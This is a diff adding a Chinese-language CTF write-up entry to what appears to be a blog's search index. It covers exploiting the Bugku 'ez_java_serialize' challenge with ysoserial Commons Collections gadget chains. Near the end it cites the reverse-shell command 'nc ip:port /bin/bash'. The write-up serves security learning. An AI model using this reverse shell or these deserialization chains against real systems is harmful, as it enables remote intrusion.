@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Bugku</title>
+    <link href="/2022/04/06/Bugku/"/>
+    <url>/2022/04/06/Bugku/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h1><h2 id="ez-java-serialize"><a href="#ez-java-serialize" class="headerlink" title="ez_java_serialize"></a>ez_java_serialize</h2><p>下载源码，清晰可见cc</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143676.png" alt="QQ截图20220406113052"></p><p>在用自己的代码，想进行恶意类加载<code>反弹shell</code>或者<code>创造回显</code>（本地是可以打通发的），均已失败告终。最后用yso，一键生成代码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143180.png" alt="QQ截图20220406113301"></p><p>这里经过测试<code>cc5.6.7</code>的链均可以打。但是实际上这里满足条件的还有1，3链</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143886.png" alt="QQ截图20220406113531"></p><p>1也没有通（lazymap的版本限制应该是），3因为之前进行类加载的时候就打不通，yso的cc3明显利用了，所以也打不通。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143916.png" alt="QQ截图20220406113933"></p><p>值得注意的一点这里，反弹shell用的  <code>nc ip:port /bin/bash</code><br>最后也成功的打了出来。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143078.png" alt="QQ截图20220406114105"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>java</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>JAVA反序列化回显学习</title>
     <link href="/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/"/>
     <url>/2022/04/04/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/</url>
